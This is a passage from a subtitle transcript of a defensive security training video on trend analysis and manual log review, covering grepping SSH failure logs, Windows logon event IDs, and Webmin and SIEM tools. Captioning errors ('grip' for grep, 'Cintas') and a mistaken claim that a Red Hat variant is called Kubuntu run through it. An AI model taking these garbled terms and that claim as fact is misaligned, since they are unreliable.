00:06:01.459\nThey all kinda blend together and once\nyou've done the correlation, we have this\n\n122\n00:06:01.459 --> 00:06:05.315\ninformation we can kinda now use that\ninformation what are we looking for.\n\n123\n00:06:05.315 --> 00:06:07.225\nI mean, what are we, how, what's that, but\n\n124\n00:06:07.225 --> 00:06:09.495\nmaybe one of our first steps\nin using that information.\n\n125\n00:06:09.495 --> 00:06:10.945\n&gt;&gt; Yeah, a lot of times will you do this.\n\n126\n00:06:10.945 --> 00:06:14.735\nOnce you actually get the data, you'll\nprobably start doing some sort of analysis\n\n127\n00:06:14.735 --> 00:06:18.255\non but we talk about different\nanalysis techniques in the past but\n\n128\n00:06:18.255 --> 00:06:20.600\nthe one I'm gonna bring out\nhere is trend analysis.\n\n129\n00:06:20.600 --> 00:06:23.140\nAs now I want to start looking for\nthose trends.\n\n130\n00:06:23.140 --> 00:06:25.280\nWhere are the attacks coming from?\n\n131\n00:06:25.280 --> 00:06:28.590\nHow are they being deployed?\n\n132\n00:06:28.590 --> 00:06:29.630\nWhat are they looking for?\n\n133\n00:06:29.630 --> 00:06:32.990\nWhat can I discern based\noff the information I have?\n\n134\n00:06:32.990 --> 00:06:38.340\nI'm trying to predict based off of what\nI have seen, what I am going to see.\n\n135\n00:06:38.340 --> 00:06:39.630\nIf that makes sense.\n\n136\n00:06:39.630 --> 00:06:42.770\nHopefully that's how that goes.\n\n137\n00:06:42.770 --> 00:06:47.250\nSo I've seen from the trends now to try\nto predict trends in the future, right?\n\n138\n00:06:47.250 --> 00:06:53.140\nSo, looks at the overall states of the\nsystems and what is the security in it?\n\n139\n00:06:53.140 --> 00:06:54.540\nSo, here's an example.\n\n140\n00:06:54.540 --> 00:06:59.820\nYou say you predict that Cross-site\nScripting vulnerability is on the rise.\n\n141\n00:06:59.820 --> 00:07:03.790\nYou see that the data is trending\nupward on Cross-site Scripting.\n\n142\n00:07:03.790 --> 00:07:07.785\nSo as you're deploying your servers, you\nstart to deploy the latest and greatest\n\n143\n00:07:07.785 --> 00:07:13.320\nCross-site Scripting defenses that you\nhave available to you in the browser and\n\n144\n00:07:13.320 --> 00:07:18.110\nthe web server itself in the way that you\ncode the thing making sure that you're\n\n145\n00:07:18.110 --> 00:07:22.210\nfollowing good coding practices all the\nsecurity is built in that you can muster.\n\n146\n00:07:22.210 --> 00:07:26.140\nLooking at new and interesting ways\nin which to safeguard yourself\n\n147\n00:07:26.140 --> 00:07:29.890\nagainst cross-site scripting and you start\nfocusing in on cross-site scripting so\n\n148\n00:07:29.890 --> 00:07:34.710\nthat when cross-site scripting\nbecomes the biggest thing for\n\n149\n00:07:34.710 --> 00:07:36.730\nattacks against web servers.\n\n150\n00:07:36.730 --> 00:07:38.260\nWell you're already prepared.\n\n151\n00:07:38.260 --> 00:07:39.990\nSo that's why we use the trend analysis.\n\n152\n00:07:39.990 --> 00:07:43.080\nWe're trying to create that\npredictive model to look for\n\n153\n00:07:43.080 --> 00:07:45.980\nwhere's this gonna go and\nhow can I prevent it?\n\n154\n00:07:45.980 --> 00:07:48.914\nHow can I go ahead and get in front of\nthings before it becomes a problem?\n\n155\n00:07:48.914 --> 00:07:51.115\nI don't wanna be reactionary.\n\n156\n00:07:51.115 --> 00:07:53.888\nI wanna be proactive and\nnot reactive as much as I possibly can.\n\n157\n00:07:53.888 --> 00:07:55.971\nTrend analysis can help us with that.\n\n158\n00:07:55.971 --> 00:07:57.950\n&gt;&gt; You know you're looking\nto the future on one right?\n\n159\n00:07:57.950 --> 00:07:58.718\n&gt;&gt; Yes sir.\n\n160\n00:07:58.718 --> 00:08:01.410\n&gt;&gt; You're looking and\nprojecting things forward right?\n\n161\n00:08:01.410 --> 00:08:04.580\nI know we've heard the same proverb and\nI'm going to paraphrase it so\n\n162\n00:08:04.580 --> 00:08:05.480\nI don't murder it here.\n\n163\n00:08:05.480 --> 00:08:09.725\nBut one of the things that we've heard\nbefore, to tell where we are going,\n\n164\n00:08:09.725 --> 00:08:11.885\nall we have to do is look\nat where we have been.\n\n165\n00:08:11.885 --> 00:08:16.685\nSo are there things that we can do if\nwe know where we came from that can\n\n166\n00:08:16.685 --> 00:08:18.315\nhelp us to maybe predict the future?\n\n167\n00:08:18.315 --> 00:08:20.705\n&gt;&gt; Yes totally,\nwhere is this data coming from?\n\n168\n00:08:20.705 --> 00:08:24.495\nWell it is historical in nature, so\nwe have to do a historical analysis.\n\n169\n00:08:24.495 --> 00:08:27.580\nThis is the data that feeds\ninto our trend analysis.\n\n170\n00:08:27.580 --> 00:08:31.001\nSo we're pulling in stuff\nthat has happened in time.\n\n171\n00:08:31.001 --> 00:08:33.364\nWell obviously we can't\npull down from the future,\n\n172\n00:08:33.364 --> 00:08:37.180\nI mean, if you can that happen,\nyour going to be an extremely rich person.\n\n173\n00:08:37.180 --> 00:08:40.690\nOr maybe very philanthropic,\nif you're going that way.\n\n174\n00:08:40.690 --> 00:08:44.000\nBut, we need that stuff from the past,\n\n175\n00:08:44.000 --> 00:08:48.270\nto try to feed into our trade analysis for\nour prediction in future.\n\n176\n00:08:48.270 --> 00:08:53.650\nSo Wes is exactly right, we need to look\nat what, historically, has been the case?\n\n177\n00:08:53.650 --> 00:08:57.346\nAnd then use that inside of our trend\nanalysis to try to predict what's going to\n\n178\n00:08:57.346 --> 00:08:58.420\nhappen in the future.\n\n179\n00:08:58.420 --> 00:09:03.384\nSo there's kind of a hand holding thing\ngoing on there with historic analysis and\n\n180\n00:09:03.384 --> 00:09:05.796\nfriend analysis, they kind of block.\n\n181\n00:09:05.796 --> 00:09:09.020\nNow what if let's say we\nwant to be proactive, right?\n\n182\n00:09:09.020 --> 00:09:10.660\n&gt;&gt; And we don't want to be reactive, but\n\n183\n00:09:10.660 --> 00:09:13.310\nthere are some times that\nwe do have to be reactive.\n\n184\n00:09:13.310 --> 00:09:15.090\nLet's say you mentioned our DMZ.\n\n185\n00:09:15.090 --> 00:09:18.620\nYou've got a webserver out there, and\nwe think that it's being attacked.\n\n186\n00:09:18.620 --> 00:09:20.280\nSometimes when we're not using analysis,\nright?\n\n187\n00:09:20.280 --> 00:09:21.730\nSometimes we have to get\nin there ourselves and\n\n188\n00:09:21.730 --> 00:09:23.600\nreally do the hard heavy lifting, right?\n\n189\n00:09:23.600 --> 00:09:24.640\n&gt;&gt; That's exactly right.\n\n190\n00:09:24.640 --> 00:09:29.390\nJust because we have automated tools to,\nlike SIEM systems and things like that.\n\n191\n00:09:29.390 --> 00:09:32.430\nThese are all great stuff that\npull this data in for us.\n\n192\n00:09:32.430 --> 00:09:38.990\nWe, as the security practitioner, still\nmust be doing some sort of manual review.\n\n193\n00:09:38.990 --> 00:09:42.570\nWe have to look at these logs and we have\nto manually review them, take a look and\n\n194\n00:09:42.570 --> 00:09:45.250\nsee what do we think, and use that.\n\n195\n00:09:45.250 --> 00:09:48.448\nI mean of course there are models that\nyou can throw these things in and\n\n196\n00:09:48.448 --> 00:09:51.222\nhave AI machine learning and\nall the other cool buzzwords.\n\n197\n00:09:51.222 --> 00:09:55.612\nTo try to help you along with this,\nbut it is always good practice for\n\n198\n00:09:55.612 --> 00:09:58.860\nus to get in there,\nuse our eyes, use our brains.\n\n199\n00:09:58.860 --> 00:10:03.203\nAnd go, man, I've seen this kind\nof thing before, [INAUDIBLE].\n\n200\n00:10:03.203 --> 00:10:09.666\nIt's that intuition, that experience that\nwe have as humans and practitioners of\n\n201\n00:10:09.666 --> 00:10:15.779\nsecurity that will feed into our ability\nto spots interesting trends in data.\n\n202\n00:10:15.779 --> 00:10:19.862\n.And bring it together and\nmake it become a narrative to,\n\n203\n00:10:19.862 --> 00:10:24.350\nmaybe this is an attack and I need\nto start looking at a little closer.\n\n204\n00:10:24.350 --> 00:10:27.227\n&gt;&gt; You know, Dan, you call me up in the\nmiddle of the night, you say, hey, Wes,\n\n205\n00:10:27.227 --> 00:10:28.768\nyou know, we've got an attack, right?\n\n206\n00:10:28.768 --> 00:10:30.380\nAnd I'm gonna have to\ndo the heavy lifting.\n\n207\n00:10:30.380 --> 00:10:33.330\nCan you give me an example of where\nI might start looking if I'm doing\n\n208\n00:10:33.330 --> 00:10:34.040\na manual review?\n\n209\n00:10:34.040 --> 00:10:36.120\n&gt;&gt; Yeah, this is gonna be our logs.\n\n210\n00:10:36.120 --> 00:10:38.810\nThis is easy peasy lemon squeezy.\n\n211\n00:10:38.810 --> 00:10:41.611\nWe are talking about looking at logs here,\nright?\n\n212\n00:10:41.611 --> 00:10:43.430\n[COUGH] Excuse me.\n\n213\n00:10:43.430 --> 00:10:44.720\nSo what are the logs that we look at?\n\n214\n00:10:44.720 --> 00:10:48.640\nThese are firewall logs,\nwe've got sys logs, authentication logs,\n\n215\n00:10:48.640 --> 00:10:51.200\nevent logs, all the wonderful logs we.\n\n216\n00:10:51.200 --> 00:10:55.490\nWes, I think this is the first ISS\nshow you've been on with me, right?\n\n217\n00:10:55.490 --> 00:10:57.030\n&gt;&gt; That's right.\n\n218\n00:10:57.030 --> 00:10:59.740\nWe've talked about logs\nthroughout this entire series.\n\n219\n00:10:59.740 --> 00:11:02.720\nAnd the people out there are going\nit's like a drinking game now.\n\n220\n00:11:02.720 --> 00:11:04.740\nWhen he mentions logs you've\ngot to take a drink right?\n\n221\n00:11:04.740 --> 00:11:05.280\n&gt;&gt; That's right.\n\n222\n00:11:05.280 --> 00:11:06.530\n&gt;&gt; It's always about the log.\n\n223\n00:11:06.530 --> 00:11:08.410\n&gt;&gt; It's the lumberjack show.\n\n224\n00:11:08.410 --> 00:11:12.220\n&gt;&gt; This is the data that we use\nto figure these things out so\n\n225\n00:11:12.220 --> 00:11:13.890\nwe've got to look at these logs.\n\n226\n00:11:13.890 --> 00:11:15.190\nAnd I do want to kind of like\n\n227\n00:11:15.190 --> 00:11:16.800\ntake a look at some of the ways\nin which we can do that.\n\n228\n00:11:16.800 --> 00:11:17.860\nWe've seen this in the past but\n\n229\n00:11:17.860 --> 00:11:22.700\nI'm going to show you some different\nways to do some log review for yourself.\n\n230\n00:11:22.700 --> 00:11:23.950\nMaybe make it a little easier.\n\n231\n00:11:23.950 --> 00:11:26.630\nWe've got the old school way of\njust bringing up a terminal.\n\n232\n00:11:26.630 --> 00:11:27.820\nI say we.\n\n233\n00:11:27.820 --> 00:11:28.740\nHere we go.\n\n234\n00:11:28.740 --> 00:11:29.920\nLet's go ahead and do that.\n\n235\n00:11:29.920 --> 00:11:32.250\nLet me get out of here,\nI'm already in viral log.\n\n236\n00:11:32.250 --> 00:11:37.480\nLet me get this a little larger,\nmy screen here is.\n\n237\n00:11:37.480 --> 00:11:39.360\nCome here little guy.\n\n238\n00:11:39.360 --> 00:11:41.200\nAnd get to the edge of that.\n\n239\n00:11:41.200 --> 00:11:43.410\nA little too wide for us here.\n\n240\n00:11:43.410 --> 00:11:47.530\nThere we go, now we can do that,\nmake it easy for people to see.\n\n241\n00:11:47.530 --> 00:11:49.740\nAnd here is our logs, I am in /var/Log#.\n\n242\n00:11:49.740 --> 00:11:53.470\nIf I do a pwd you'll see I'm in var log.\n\n243\n00:11:53.470 --> 00:11:58.010\nAnd do an ls,\nplenty of logs of us to peruse in here.\n\n244\n00:11:58.010 --> 00:12:02.910\nNow this is probably the hardest way, and\nmost manual way in which we're gonna do\n\n245\n00:12:02.910 --> 00:12:06.940\nthe log review, to come in here and\nsay, okay, well, what logs do I have?\n\n246\n00:12:06.940 --> 00:12:11.410\nThere's authorization logs,\nif I'm running a web service, like Apache,\n\n247\n00:12:11.410 --> 00:12:15.550\nI can go into Apache2,\nlook at the logs that are inside of there.\n\n248\n00:12:15.550 --> 00:12:19.250\nWe've got the kern.logs,\nremember that was how we 're\n\n249\n00:12:19.250 --> 00:12:23.830\nto see if IPtables we're to log something,\nso it's where our firewall logs go.\n\n250\n00:12:23.830 --> 00:12:25.280\nIf I'm using IPtables.\n\n251\n00:12:25.280 --> 00:12:27.640\nAgain if I'm in a Cisco device,\nthat's a different story, you go there.\n\n252\n00:12:27.640 --> 00:12:28.410\nIt's got it's own logs,\n\n253\n00:12:28.410 --> 00:12:32.560\nmaybe, pushing back to the syslog\nserver which we have set up.\n\n254\n00:12:32.560 --> 00:12:34.290\nWhat else do we have in here?\n\n255\n00:12:34.290 --> 00:12:37.960\nApplications that we have installed\nwill have their logs in here.\n\n256\n00:12:37.960 --> 00:12:40.470\nSo I've got openvas installed so\n\n257\n00:12:40.470 --> 00:12:43.190\nit's logs will go here if I want\nto take a look at that stuff.\n\n258\n00:12:43.190 --> 00:12:47.240\nBack on our Cintas] we had Snort\nwe will have a Snort folder here.\n\n259\n00:12:47.240 --> 00:12:52.610\nSo again, walking through that but\nthis is the most manual ways.\n\n260\n00:12:52.610 --> 00:12:55.133\nSo let's say I wanna look\nat authorization logs.\n\n261\n00:12:55.133 --> 00:12:57.900\nLet me jump over to\nthe Cintas real quickly.\n\n262\n00:12:57.900 --> 00:13:02.685\nBecause I'm kinda using this as an actual\nserver of course to look at and\n\n263\n00:13:02.685 --> 00:13:05.128\nget logged.\n\n264\n00:13:05.128 --> 00:13:07.285\nBring up the terminal.\n\n265\n00:13:07.285 --> 00:13:12.830\n[COUGH] Excuse me,\nI've got a little froggy throat going on.\n\n266\n00:13:12.830 --> 00:13:16.370\nThere we go.\nAnd if I go into Cintas and\n\n267\n00:13:16.370 --> 00:13:22.934\nwe go into Var, I just can't do it.\n\n268\n00:13:22.934 --> 00:13:25.890\nLog and I think here it's audits.\n\n269\n00:13:25.890 --> 00:13:31.260\nBecause this is a Red Hat variant it's\ncalled Kubuntu so yeah it's audit.\n\n270\n00:13:31.260 --> 00:13:33.470\nSo I go into audit which\nI think I have to do.\n\n271\n00:13:33.470 --> 00:13:37.730\nThere we go,\n\n272\n00:13:37.730 --> 00:13:41.840\ncd into audit, I've got audit.log so\n\n273\n00:13:41.840 --> 00:13:49.030\nI say okay let me see the audit.log and\nthere's a lot of information there.\n\n274\n00:13:49.030 --> 00:13:51.470\nThanks so much, appreciate your help.\n\n275\n00:13:51.470 --> 00:13:56.120\nI'm going to try to give us as\nbest a view of this as possible.\n\n276\n00:13:57.210 --> 00:14:02.130\nBut in here I'm auditing successful\nauthorizations or login attempts.\n\n277\n00:14:02.130 --> 00:14:05.130\nAnd we can see that here,\nhere's something.\n\n278\n00:14:05.130 --> 00:14:10.540\nThere was a lot that was happening,\nusername, I'm sure it's in here somewhere.\n\n279\n00:14:10.540 --> 00:14:14.090\nBut some sort of\nsuccessful login occurred.\n\n280\n00:14:14.090 --> 00:14:15.857\nBut what if I'm looking for\nsomething specific?\n\n281\n00:14:15.857 --> 00:14:19.331\nThat's where we've got to get really\ncreative with our ability to use things\n\n282\n00:14:19.331 --> 00:14:21.620\nlike and our regular expression.\n\n283\n00:14:21.620 --> 00:14:22.780\nA simple way,\n\n284\n00:14:22.780 --> 00:14:27.590\nI know that I've performed a SSH\nbrute-force attack against this machine.\n\n285\n00:14:27.590 --> 00:14:30.300\nI want to look at the SSH logs themselves.\n\n286\n00:14:30.300 --> 00:14:31.880\nThey'll do the same thing.\n\n287\n00:14:31.880 --> 00:14:33.760\nI know this is poor gripping but\n\n288\n00:14:33.760 --> 00:14:37.660\nit's just old habits die hard right so\nI'm gonna grip SSH.\n\n289\n00:14:38.810 --> 00:14:40.730\nLet's see.\nOkay, now, here's all my SSH logs.\n\n290\n00:14:40.730 --> 00:14:42.150\nI can see here.\n\n291\n00:14:42.150 --> 00:14:47.330\nThis is a successful SSH login,\nso that's good.\n\n292\n00:14:47.330 --> 00:14:48.320\nHere's another one.\n\n293\n00:14:48.320 --> 00:14:49.990\nBut, okay, maybe I don't want success.\n\n294\n00:14:49.990 --> 00:14:51.190\nI just want to look at the failures.\n\n295\n00:14:51.190 --> 00:14:56.940\nSo I'll do grip fail,\ngrip, grap, fail, fail.\n\n296\n00:14:56.940 --> 00:14:58.540\nThere we go.\n\n297\n00:14:59.820 --> 00:15:02.260\nAll right,\nnow I'm starting to see more stuff.\n\n298\n00:15:02.260 --> 00:15:06.160\nSo I can see account devouring,\nabout to be logged in and\n\n299\n00:15:06.160 --> 00:15:08.004\nhas failed, here's where it came from.\n\n300\n00:15:08.004 --> 00:15:14.460\nOn that 55.225 from 192.168, so now I'm\n\n301\n00:15:14.460 --> 00:15:19.420\nstarting to filter down, it's like get the\nlogs that I need and see what's going on.\n\n302\n00:15:19.420 --> 00:15:21.550\nI see a lot of failures.\n\n303\n00:15:21.550 --> 00:15:23.700\nAnd if I'm looking at this and\n\n304\n00:15:23.700 --> 00:15:26.310\nin a very short life span,\nI'd see a bunch of failures.\n\n305\n00:15:26.310 --> 00:15:28.800\nI think there's about a 190 attempts\n\n306\n00:15:28.800 --> 00:15:33.760\nthroughout here because I also alerted by\nthe system when I logged in initially.\n\n307\n00:15:33.760 --> 00:15:38.547\nIt said, last log n through SSHD\noccurred on this time at this date.\n\n308\n00:15:38.547 --> 00:15:42.151\nAnd there were 192\ndifferent login attempts.\n\n309\n00:15:42.151 --> 00:15:44.110\nAnd well that's good info.\n\n310\n00:15:44.110 --> 00:15:47.633\nI'm going to go check the logs now and\nsee what was going on, and\n\n311\n00:15:47.633 --> 00:15:49.308\nnow I can see that right here.\n\n312\n00:15:49.308 --> 00:15:53.703\nNow again, this was a very pointed way in\ndoing this as far as using the terminal\n\n313\n00:15:53.703 --> 00:15:55.247\ngoing super old school,.\n\n314\n00:15:55.247 --> 00:15:57.705\nBut there are graphical ways to do this.\n\n315\n00:15:57.705 --> 00:16:00.986\n[COUGH] Excuse me close this terminal.\n\n316\n00:16:00.986 --> 00:16:04.405\nA lot of the Linux systems, and\neven Windows as well, remember,\n\n317\n00:16:04.405 --> 00:16:05.935\nit's got the event viewer.\n\n318\n00:16:05.935 --> 00:16:07.055\nWe can go in there and see that.\n\n319\n00:16:07.055 --> 00:16:10.860\nThey'll have a graphical utility,\nprobably in system tools.\n\n320\n00:16:10.860 --> 00:16:13.800\nLet's see here, do they have logs in here?\n\n321\n00:16:13.800 --> 00:16:18.673\nNo, maybe in utilities,\nlet's see utilities.\n\n322\n00:16:19.966 --> 00:16:21.050\nLet's see here.\n\n323\n00:16:21.050 --> 00:16:22.310\nIs it in there?\nOr it's not.\n\n324\n00:16:22.310 --> 00:16:23.200\nThere we go, system log.\n\n325\n00:16:23.200 --> 00:16:25.210\nIt's got a system log viewer.\n\n326\n00:16:25.210 --> 00:16:26.020\nI can bring that up.\n\n327\n00:16:26.020 --> 00:16:27.620\nLet's take a look at that.\n\n328\n00:16:27.620 --> 00:16:31.690\nObviously, it takes just a second,\nas the spinning wheel of doom\n\n329\n00:16:32.870 --> 00:16:36.240\nmakes us wait so, so\npatiently to get in there.\n\n330\n00:16:36.240 --> 00:16:38.140\nWhile that's doing that,\nlet's jump over to Windows.\n\n331\n00:16:38.140 --> 00:16:40.490\nWe won't wait for it.\n\n332\n00:16:40.490 --> 00:16:43.200\nBring up the event viewer, event viewer.\n\n333\n00:16:43.200 --> 00:16:46.270\nThere we go.\n\n334\n00:16:46.270 --> 00:16:49.020\nThere you go, Windows, good job.\n\n335\n00:16:49.020 --> 00:16:50.980\nGo into the security logs.\n\n336\n00:16:50.980 --> 00:16:54.080\nIf you're auditing logins successes and\n\n337\n00:16:54.080 --> 00:16:56.810\nfailures, then you'll be\nable to find these in here.\n\n338\n00:16:56.810 --> 00:17:01.750\nAn easy way to check this out is going\nover to the filter current log area, and\n\n339\n00:17:01.750 --> 00:17:02.710\ngive it the events ID.\n\n340\n00:17:03.760 --> 00:17:07.848\nThe events ID's that you're going\nto want for log on successes and\n\n341\n00:17:07.848 --> 00:17:12.382\nfailures are going to be 4624 for\nsuccess and 4625 for failures.\n\n342\n00:17:12.382 --> 00:17:15.096\nSo if I want to see successes,\nI would do 4624, but\n\n343\n00:17:15.096 --> 00:17:18.690\nI'm going to do 4625,\nI wanna see some failures.\n\n344\n00:17:18.690 --> 00:17:20.300\nI'll say okay.\n\n345\n00:17:20.300 --> 00:17:26.487\nAnd now in my view here, if I can grab,\nthere we go, I can see all the failures.\n\n346\n00:17:26.487 --> 00:17:31.093\nAnd say, I'm seeing a trend here at 8:29,\nand 41 seconds, and\n\n347\n00:17:31.093 --> 00:17:36.013\n39 seconds, and 37 seconds, and\n35, about every couple of seconds\n\n348\n00:17:36.013 --> 00:17:39.782\nthere was a different logon\nattempt that was happening.\n\n349\n00:17:39.782 --> 00:17:43.900\nWell, let's take a look at that,\n\n350\n00:17:43.900 --> 00:17:47.734\nthank you and what was going on.\n\n351\n00:17:47.734 --> 00:17:53.483\nSo here's the security information about\nthat, an account failed to log on.\n\n352\n00:17:53.483 --> 00:17:58.379\nHere's the system, here's the account\nname, here's the account domain, so\n\n353\n00:17:58.379 --> 00:17:59.829\nthis is in a work group.\n\n354\n00:18:00.860 --> 00:18:02.720\nAnd I get all the information\nI need about this.\n\n355\n00:18:02.720 --> 00:18:06.430\nAnd now I need to call that user and say,\nhear you were having trouble logging on,\n\n356\n00:18:06.430 --> 00:18:08.340\nthis is manual review.\n\n357\n00:18:08.340 --> 00:18:11.720\nLet's jump back over to, this guy here.\n\n358\n00:18:11.720 --> 00:18:14.880\nApparently, their little log\nsystem is just a big pile of junk.\n\n359\n00:18:14.880 --> 00:18:16.530\nSo hey, but you know what, that happens.\n\n360\n00:18:16.530 --> 00:18:20.410\nWhen you're talking an open source\ncommunity, there's really not a given on\n\n361\n00:18:20.410 --> 00:18:24.010\na lot of the products that may be built\ninto the system you're working with.\n\n362\n00:18:24.010 --> 00:18:27.850\nSo, that's just, that's just part and\npartial of working with these systems.\n\n363\n00:18:27.850 --> 00:18:31.260\nYou find that it doesn't work, maybe you\nwant to find something that does work,\n\n364\n00:18:31.260 --> 00:18:34.790\nmaybe a little better supported,\nmaybe that has a community behind it.\n\n365\n00:18:34.790 --> 00:18:38.130\nIt could be a little easier to work with,\nokay?\n\n366\n00:18:38.130 --> 00:18:39.780\nI like using Webmin.\n\n367\n00:18:39.780 --> 00:18:41.250\nThere's also Big Dogs out there.\n\n368\n00:18:41.250 --> 00:18:47.990\nAlienVault, OSSIM, Splunk, these guys,\nyou can get them installed and running.\n\n369\n00:18:47.990 --> 00:18:50.570\nA little more complexity to them, right?\n\n370\n00:18:50.570 --> 00:18:52.160\nBecause there's gonna be network agents,\nand\n\n371\n00:18:52.160 --> 00:18:57.100\nthey're gonna pull in data from not just\nits own system but other systems as well.\n\n372\n00:18:57.100 --> 00:19:01.970\nBut I like to work with Webmin just\nabout any time I spin up a Linux server\n\n373\n00:19:01.970 --> 00:19:03.149\nI will install Webmin,\n\n374\n00:19:03.149 --> 00:19:06.077\nbecause it makes my life a little\neasier to do the administration tasks.\n\n375\n00:19:07.320 --> 00:19:09.850\n&gt;&gt; Let's give the results of\nyour trained analysis, right,\n\n376\n00:19:09.850 --> 00:19:10.910\nkinda tie it back together.\n\n377\n00:19:10.910 --> 00:19:13.930\nYou're saying that you're paying\nattention to a whole bunch of fails.\n\n378\n00:19:13.930 --> 00:19:15.300\nWhy would I care about the fails?\n\n379\n00:19:15.300 --> 00:19:16.760\nWhy wouldn't I care about success?\n\n380\n00:19:16.760 --> 00:19:20.880\n&gt;&gt; You would care about success,\nbecause if I see a bunch of fails, and\n\n381\n00:19:20.880 --> 00:19:25.886\nthat's why I gave you the success in\nall ID for event viewer in Microsoft.\n\n382\n00:19:25.886 --> 00:19:28.473\nBut we also when look at that\ninside of the Linux system.\n\n383\n00:19:28.473 --> 00:19:30.920\nThe fails indicated\nthere's something wrong.\n\n384\n00:19:30.920 --> 00:19:33.440\nSuccess indicates something went right.\n\n385\n00:19:33.440 --> 00:19:37.610\nNow, when you put those two together, if I\nhave a bunch of something going wrong and\n\n386\n00:19:37.610 --> 00:19:42.150\nthen something going right, that could\nbe the indication of compromise, right,\n\n387\n00:19:42.150 --> 00:19:44.070\nthat could be your IOC right there.\n\n388\n00:19:44.070 --> 00:19:49.010\nSo again, you want to contact anytime\nyou see any level of failure and\n\n389\n00:19:49.010 --> 00:19:50.610\nthen leading to success, or\n\n390\n00:19:50.610 --> 00:19:53.680\njust any level of failure, you want to\nget a hold of somebody and say, hey I've\n\n391\n00:19:53.680 --> 00:19:56.900\nnoticed that you're having trouble with\nlogins, your account's been locked out.\n\n392\n00:19:56.900 --> 00:19:59.525\nI'm getting a lot of alerts that\neven the account's locked out,\n\n393\n00:19:59.525 --> 00:20:01.014\nstill attempting to be logged onto.\n\n394\n00:20:01.014 --> 00:20:01.720\nWhat is going on?\n\n395\n00:20:01.720 --> 00:20:02.760\nAre you having trouble?\n\n396\n00:20:02.760 --> 00:20:04.330\nHow come you're not calling the help desk?\n\n397\n00:20:04.330 --> 00:20:07.030\nAnd they could be completely ignorant to\nthe fact that that's happening because\n\n398\n00:20:07.030 --> 00:20:07.870\nit's not them that's doing it.\n\n399\n00:20:07.870 --> 00:20:11.203\nSo I'm gonna bring up Webmin here,\nand it just opens up in a browser,\n\n400\n00:20:11.203 --> 00:20:12.880\nwhich is another reason I like it.\n\n401\n00:20:14.370 --> 00:20:17.730\nSo we can kinda show you\na bit of how that works here.\n\n402\n00:20:17.730 --> 00:20:19.240\nSo you're just gonna go to local host.\n\n403\n00:20:20.540 --> 00:20:22.622\nAnd go to port 10,000 after\nyou get it installed.\n\n404\n00:20:22.622 --> 00:20:25.790\nAnd I think it's gonna\ngive me a redirect today.\n\n405\n00:20:25.790 --> 00:20:26.555\nIt's under HTTPS.\n\n406\n00:20:26.555 --> 00:20:29.580\nIt is secured, so good on them, right?\n\n407\n00:20:29.580 --> 00:20:31.571\nI guess I can just pull this up.\n\n408\n00:20:31.571 --> 00:20:34.230\n[INAUDIBLE] come on, work with me.\n\n409\n00:20:34.230 --> 00:20:34.960\nHere we go.\n\n410\n00:20:34.960 --> 00:20:40.340\nSo anyway you just log in\nwith your root user like so.\n\n411\n00:20:40.340 --> 00:20:42.260\nLet you get signed in.\n\n412\n00:20:42.260 --> 00:20:44.530\nYou get lovely dashboarding and things.\n\n413\n00:20:44.530 --> 00:20:45.670\nI'll blow this up.\n\n414\n00:20:47.860 --> 00:20:51.970\nWe'll start to take a close look\nat the information that we get.\n\n415\n00:20:51.970 --> 00:20:56.320\nThis type of dashboarding system is\nvery common with monitoring systems and\n\n416\n00:20:56.320 --> 00:20:58.670\nseams and other things of that nature.\n\n417\n00:20:58.670 --> 00:21:02.120\nGiving me kinda that opening page, a birds\neye view, and some of them will even allow\n\n418\n00:21:02.120 --> 00:21:07.038\nyou to new tiles and dashboard features\nto customize it in the way that you like.\n\n419\n00:21:07.038 --> 00:21:10.880\nI'm not 100% sure whether or\nnot Webmin does that,\n\n420\n00:21:10.880 --> 00:21:14.060\ncuz I typically just go with the defaults\non it, cuz I like the way it works.\n\n421\n00:21:14.060 --> 00:21:14.880\nGiving me CPU,\n\n422\n00:21:14.880 --> 00:21:19.060\nreal remember we looked at that, maybe\nwhy is my CPU spiked through the roof?\n\n423\n00:21:19.060 --> 00:21:20.690\nWhy is the memory being used up?\n\n424\n00:21:20.690 --> 00:21:21.300\nWhat is that?\n\n425\n00:21:21.300 --> 00:21:25.840\nI can see over here that I\nhave package updates waiting.\n\n426\n00:21:25.840 --> 00:21:29.880\nOne of them is a security update, so very\nnice to be able to see that right out of\n\n427\n00:21:29.880 --> 00:21:32.380\nthe gate,\ngiving me information about my system.\n\n428\n00:21:32.380 --> 00:21:33.530\nWe come back over here,\n\n429\n00:21:33.530 --> 00:21:39.590\nand we hit the system tab we will\nhave system logs, right here.\n\n430\n00:21:39.590 --> 00:21:42.870\nOnce I click on system logs,\nshould just take me a second.\n\n431\n00:21:42.870 --> 00:21:48.490\nAnd now, I can start perusing some of\nthe logs that Webmin has access to.\n\n432\n00:21:48.490 --> 00:21:50.106\nRight, so\nI wanna be able to look at those.\n\n433\n00:21:50.106 --> 00:21:54.684\nSo maybe I'll wanna look at dev console,\nor messages, or bar log secure.\n\n434\n00:21:54.684 --> 00:21:59.870\nI can click on that and\nmake some parameters about filtering here.\n\n435\n00:21:59.870 --> 00:22:03.370\nAnd you can see this a little better like\nso, and once I get the parameters that I'm\n\n436\n00:22:03.370 --> 00:22:06.360\nlooking for set in, I have view log and\nit just dumps the log.\n\n437\n00:22:06.360 --> 00:22:09.160\nSo instead of having to get fancy\nwith grip and set and hoc and\n\n438\n00:22:09.160 --> 00:22:11.750\nall that other business to get\nexactly what I'm looking for.\n\n439\n00:22:11.750 --> 00:22:16.000\nThat kinda stuff is usually built in\nto these types of systems, right?\n\n440\n00:22:16.000 --> 00:22:20.020\nSo like I said,\nif you don't like this system, go out and\n\n441\n00:22:20.020 --> 00:22:22.310\ngrab an OSSIM and see if you like that.\n\n442\n00:22:22.310 --> 00:22:27.670\nI think there's also either a demo,\ntrial, or free version of Splunk.\n\n443\n00:22:27.670 --> 00:22:29.260\nSplunk is very popular.\n\n444\n00:22:29.260 --> 00:22:30.800\nGrab that, get install.\n\n445\n00:22:30.800 --> 00:22:33.330\nStart working with these things,\nand playing with these things, and\n\n446\n00:22:33.330 --> 00:22:34.350\nsee how you like them.\n\n447\n00:22:34.350 --> 00:22:36.050\nSyslogging, obviously.\n\n448\n00:22:36.050 --> 00:22:39.040\nWe've looked at that, so\nI'm not go into too much depth on that.\n\n449\n00:22:39.040 --> 00:22:43.560\nBut it's really nice to be able\nto correlate, aggregate and\n\n450\n00:22:43.560 --> 00:22:44.860\nget it all into one space.\n\n451\n00:22:44.860 --> 00:22:49.172\nAnd now I can log into this machine\nfrom any browser on my network and\n\n452\n00:22:49.172 --> 00:22:51.492\nI can get the analytics that I need.\n\n453\n00:22:51.492 --> 00:22:55.839\nSo I can start troubleshooting\nproblems [INAUDIBLE].\n\n454\n00:22:55.839 --> 